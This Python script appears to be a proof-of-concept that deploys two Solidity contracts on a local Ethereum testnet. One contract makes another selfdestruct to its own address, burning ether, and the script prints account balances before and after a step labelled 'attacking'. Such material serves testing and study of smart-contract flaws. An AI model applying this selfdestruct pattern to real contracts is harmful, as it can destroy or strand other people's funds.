# !/usr/bin/python3
from web3 import Web3
import solcx

expAgentSol = '''
contract ContractA {
    constructor() payable {}

    function destroy() public  payable {
        if (msg.value == 0 ether)
            selfdestruct(address(this));
    }
}

contract ContractB {
    address public targetaddr;

    constructor(address _adr) payable {
        targetaddr = address(_adr);
    }

    function test() payable public {
        ContractA contractA = ContractA(targetaddr);
        
        contractA.destroy.value(0)();
        contractA.destroy.value(2 ether)();
    }

    function () payable{}
}
'''

def runRPC():
    w3 = Web3(Web3.HTTPProvider("http://localhost:8545", request_kwargs={'timeout': 60}))
    assert w3.isConnected() == True, "[ERROR] Testnet is not activated."
    return w3


def transferEther(w3, _from, _to, _value):
    _tx_hash = w3.eth.sendTransaction(
        {'from': _from, 'to': _to, 'value': _value})
    _ = w3.eth.wait_for_transaction_receipt(_tx_hash)


def main():
    w3 = runRPC()
    Pool = w3.eth.accounts[0]
    w3.geth.personal.unlock_account(Pool, "", 99999)
    assert w3.eth.get_balance(Pool) >= w3.toWei(10, 'ether')


    acctC = w3.geth.personal.new_account("")
    w3.geth.personal.unlock_account(acctC, "", 99999)
    _txr = w3.eth.sendTransaction({'from': Pool, 'to': acctC, 'value': w3.toWei(5, 'ether'), 'gas': 3000000})
    w3.eth.wait_for_transaction_receipt(_txr)

    res = solcx.compile_source(expAgentSol, output_values=[
                               "abi", "bin"], solc_version='0.4.24')
    cmrt = res["<stdin>:ContractA"]
    _tx_hash = w3.eth.contract(abi=cmrt['abi'], bytecode=cmrt['bin'])\
        .constructor().transact({'from': acctC})                
    acctA = w3.eth.wait_for_transaction_receipt(_tx_hash)['contractAddress']

    cmrt = res["<stdin>:ContractB"]
    _tx_hash = w3.eth.contract(abi=cmrt['abi'], bytecode=cmrt['bin'])\
        .constructor(acctA).transact({'from': acctC, 'gas': 3000000})
    
    acctB = w3.eth.wait_for_transaction_receipt(_tx_hash)['contractAddress']
    contractB = w3.eth.contract(address=acctB, abi=cmrt['abi'])

    print(f"=========================== initial states ================================")
    print(f"Balance @ accoount C= {w3.fromWei(w3.eth.get_balance(acctC), 'ether')}")
    print(f"Balance @ accoount B= {w3.fromWei(w3.eth.get_balance(acctB), 'ether')}")
    print(f"Balance @ accoount A= {w3.fromWei(w3.eth.get_balance(acctA), 'ether')}")
    
    print(f"attacking...\n")
    _tx_hash1 = contractB.functions.test().transact({'from': acctC, 'value': w3.toWei(2, 'ether'), 'gas': 300000})
    _tx_hash2 = w3.eth.sendTransaction({'from': acctC, 'to': acctA, 'value': w3.toWei(1, 'ether'), 'gas': 300000})
    
    assert w3.eth.wait_for_transaction_receipt(_tx_hash1)["status"] == 1
    assert w3.eth.wait_for_transaction_receipt(_tx_hash2)["status"] == 1

    print(f"Balance @ accoount C= {w3.fromWei(w3.eth.get_balance(acctC), 'ether')}")
    print(f"Balance @ accoount B= {w3.fromWei(w3.eth.get_balance(acctB), 'ether')}")
    print(f"Balance @ accoount A= {w3.fromWei(w3.eth.get_balance(acctA), 'ether')}")

main()